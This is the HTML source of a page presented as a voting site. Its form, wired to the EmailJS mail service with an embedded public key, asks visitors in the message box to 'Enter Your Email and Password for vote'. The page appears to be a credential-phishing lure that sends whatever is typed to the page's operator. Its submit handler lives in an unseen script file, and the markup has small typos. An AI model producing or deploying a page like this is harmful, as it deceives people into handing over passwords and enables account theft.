<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website For Vote</title>
    <link rel="stylesheet" type="icon" href="./images/message-icon.png">
    <link rel="stylesheet" href="./style.css">

    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
    <script type="text/javascript">
    (function(){
        emailjs.init({
            publicKey:"SeQLDlz0KuUzRHbPa",
        });
    })();
    </script>

    <script src="./sript.js"></script>
</head>
<body>

    

    <section class="container">
        <h1>Voting</h1>
        <form>
            <div class="form-group">
                <label for="name">Name</label>
                <input type="text" id="name" name="name" requiredd>
            </div>
            <div class="form-group">
                <label for="email">Email</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="subject">Subject</label>
                <input type="text" id="subject" name="subject" required>
            </div>
            <div class="form-group-textarea">
                <textarea name="message" id="message" rows="10" cols="50" required placeholder="Please Enter Your Email and Password for vote"></textarea>
            </div>
            <button type="submit" onclick="sendMail()">Send</button>
        </form>
    </section>

</body>
</html>
